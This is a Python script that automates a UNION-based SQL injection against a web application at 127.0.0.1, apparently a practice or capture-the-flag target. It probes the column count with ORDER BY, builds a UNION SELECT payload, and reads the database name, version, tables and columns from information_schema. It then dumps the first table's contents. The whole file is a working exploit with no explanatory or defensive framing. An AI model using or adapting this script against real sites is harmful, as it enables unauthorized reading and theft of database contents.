import requests as req
from bs4 import BeautifulSoup as soup

url = "http://127.0.0.1"

def getTotalColumn(url):
    temp = url + " ORDER BY {}"
    counter = 1
    total_col = 0
    while True:
        format_url = temp.format(counter)
        format_response = req.get(format_url)
        format_obj = soup(format_response.text,'html.parser')
        comments = format_obj.find('div',{'class':'comment-drops'})
        if comments is None:
            total_col = counter - 1
            break
        counter = counter + 1
    return total_col

def getDumpUrl(url,total_col):
    dump_url = url + " UNION SELECT "
    for i in range(1, total_col + 1):
        dump_url = dump_url + str(i)
        if i != total_col:
            dump_url = dump_url + ','
    return dump_url

def getDatabase(url):
    database_url = url.replace('4','DATABASE()')
    database_web = req.get(database_url)
    database_soup = soup(database_web.text,'html.parser')
    contents = database_soup.findAll('div',{'class':'com-con'})
    # for content in contents:
    #     print(content.text.strip())
    return contents[-1].text.strip()

def getVersion(url):
    version_url = url.replace('4','@@Version')
    version_web = req.get(version_url)
    version_soup = soup(version_web.text,'html.parser')
    contents = version_soup.findAll('div',{'class':'com-con'})
    for content in contents:
        print(content.text.strip())
    return contents[-1].text.strip()

def getTables(url, database):
    tables_url = url + " from information_schema.tables where table_schema='" + database +"'"
    tables_url = tables_url.replace('4','group_concat(table_name)')
    tables_web = req.get(tables_url)
    tables_soup = soup(tables_web.text,'html.parser')
    contents = tables_soup  .findAll('div',{'class':'com-con'})
    # for content in contents:
    #     print(content.text.strip())
    tables = contents[-1].text.strip().split(',')
    return tables

def printColumns(url, database, tables):
    for table in tables:
        table = table.strip()
        columns_url = url + " from information_schema.columns where table_schema='" + database + "'"
        columns_url = columns_url + " and table_name='" + table +"'"
        columns_url = columns_url.replace('4','group_concat(column_name)')
        columns_web = req.get(columns_url)
        columns_soup = soup(columns_web.text,'html.parser')
        contents = columns_soup.findAll('div',{'class':'com-con'})
        columns = contents[-1].text.strip().split(',')
        print(table)
        print("=============")
        for column in columns:
            print(column)
        print('\n')

def retrieveCommentContent(url, tables):
    url = url + " UNION SELECT * FROM " + tables[0].strip()
    content_web = req.get(url)
    content_soup = soup(content_web.text,'html.parser')
    contents = content_soup.findAll('div',{'class':'com-con'})
    for content in contents:
        print(content.text.strip())

def main():
    response = req.get(url)
    home_web = soup(response.text, 'html.parser')
    # print(home_web.prettify())
    detail_ref = home_web.find('a',{'class':'game-ref'})
    # print(detail_ref['href'])
    detail_url = url + '/' + detail_ref['href']
    total_col = getTotalColumn(detail_url)
    # print(total_col)
    dump_url = getDumpUrl(detail_url,total_col)
    # print(dump_url)
    union_web = req.get(dump_url)
    union_obj = soup(union_web.text,'html.parser')
    # print(union_obj.prettify())
    database = getDatabase(dump_url)
    # version = getVersion(dump_url)
    tables = getTables(dump_url,database)
    # printColumns(dump_url, database, tables)
    retrieveCommentContent(detail_url,tables)

if __name__ == '__main__':
    main()
